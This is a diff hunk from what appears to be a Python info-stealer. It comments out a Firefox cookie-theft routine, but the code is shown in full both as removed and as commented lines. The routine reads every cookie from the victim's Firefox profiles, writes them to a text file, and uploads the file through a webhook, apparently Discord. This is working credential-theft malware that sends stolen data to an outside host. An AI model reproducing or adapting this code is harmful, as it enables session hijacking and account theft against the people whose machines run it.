@@ -129,32 +129,32 @@ def Chrome():
 ###########################################################################
 
 ######################## Firefox cookie ########################
-def Firefox():
-    textf = ''
-    textf += 'Firefox Cookies:' + '\n'
-    textf += 'URL | COOKIE | COOKIE NAME' + '\n'
-    for root, dirs, files in os.walk(os.getenv("APPDATA") + '\\Mozilla\\Firefox\\Profiles'):
-        for name in dirs:
-            conn = sqlite3.connect(os.path.join(root, name)+'\\cookies.sqlite')
-            cursor = conn.cursor()
-            cursor.execute("SELECT baseDomain, value, name FROM moz_cookies")
-            data = cursor.fetchall()
-            for i in range(len(data)):
-                url, cookie, name = data[i]
-                textf += url + ' | ' + str(cookie) + ' | ' + name + '\n'    
-        break
-    return textf
-file = open(os.getenv("APPDATA") + '\\firefox_cookies.txt', "w+")
-file.write(str(Firefox()) + '\n')
-file.close()
+# def Firefox():
+#     textf = ''
+#     textf += 'Firefox Cookies:' + '\n'
+#     textf += 'URL | COOKIE | COOKIE NAME' + '\n'
+#     for root, dirs, files in os.walk(os.getenv("APPDATA") + '\\Mozilla\\Firefox\\Profiles'):
+#         for name in dirs:
+#             conn = sqlite3.connect(os.path.join(root, name)+'\\cookies.sqlite')
+#             cursor = conn.cursor()
+#             cursor.execute("SELECT baseDomain, value, name FROM moz_cookies")
+#             data = cursor.fetchall()
+#             for i in range(len(data)):
+#                 url, cookie, name = data[i]
+#                 textf += url + ' | ' + str(cookie) + ' | ' + name + '\n'    
+#         break
+#     return textf
+# file = open(os.getenv("APPDATA") + '\\firefox_cookies.txt', "w+")
+# file.write(str(Firefox()) + '\n')
+# file.close()
 
-cookies = File(os.getenv("APPDATA") + '\\firefox_cookies.txt')
-embed = Embed(
-    description=f'Firefox Cookies',
-    color=0x5CDBF0,
-    timestamp='now'  
-    )
-hook.send(embed=embed, file=cookies)
+# cookies = File(os.getenv("APPDATA") + '\\firefox_cookies.txt')
+# embed = Embed(
+#     description=f'Firefox Cookies',
+#     color=0x5CDBF0,
+#     timestamp='now'  
+#     )
+# hook.send(embed=embed, file=cookies)
 
 ################################################################
 
